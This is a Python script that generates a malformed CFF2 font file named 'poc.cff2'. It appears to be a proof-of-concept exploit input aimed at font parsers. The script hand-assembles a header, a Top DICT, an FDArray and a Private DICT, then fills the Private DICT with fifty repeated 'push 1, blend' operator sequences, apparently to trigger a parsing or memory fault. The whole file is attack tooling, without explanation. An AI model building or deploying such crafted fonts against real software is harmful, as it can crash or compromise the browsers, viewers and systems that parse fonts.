import struct

def pack_dict_op(op):
    if isinstance(op, int):
        return bytes([op])
    return op

def pack_dict_int(val):
    if -107 <= val <= 107:
        return bytes([val + 139])
    elif 108 <= val <= 1131:
        val -= 108
        return bytes([(val >> 8) + 247, val & 0xFF])
    elif -1131 <= val <= -108:
        val = -val - 108
        return bytes([(val >> 8) + 251, val & 0xFF])
    else:
        return bytes([28]) + struct.pack('>h', val)

def make_cff2():
    # Header
    header = bytes([2, 0, 5, 0, 0]) # major=2, minor=0, hdrSize=5, topDictLength=0 (will patch)

    # Top DICT
    top_dict = pack_dict_int(24) + pack_dict_op(bytes([12, 36])) # FDArray offset = 24
    header = bytes([2, 0, 5]) + struct.pack('>H', len(top_dict)) + top_dict

    # Global Subr INDEX
    global_subr = bytes([0, 0]) # count=0

    # FDArray INDEX
    # We need 1 FontDict. 
    # FontDict contains Private DICT size and offset (operator 18)
    fd_data = pack_dict_int(100) + pack_dict_int(30) + pack_dict_op(18) # size=100, offset=30
    fd_index = bytes([0, 1, 1, 1, 1 + len(fd_data)]) + fd_data

    # Padding to offset 30
    cff2 = header + global_subr + fd_index
    if len(cff2) < 30:
        cff2 += b'\x00' * (30 - len(cff2))

    # Private DICT at offset 30
    # We need multiple blend operators. 
    # blend operator is 16. It pops numBlends (last item on stack).
    # We will push 1, then blend, repeatedly.
    private_dict = b''
    for _ in range(50):
        private_dict += pack_dict_int(1) + pack_dict_op(16)

    cff2 += private_dict
    return cff2

with open('poc.cff2', 'wb') as f:
    f.write(make_cff2())
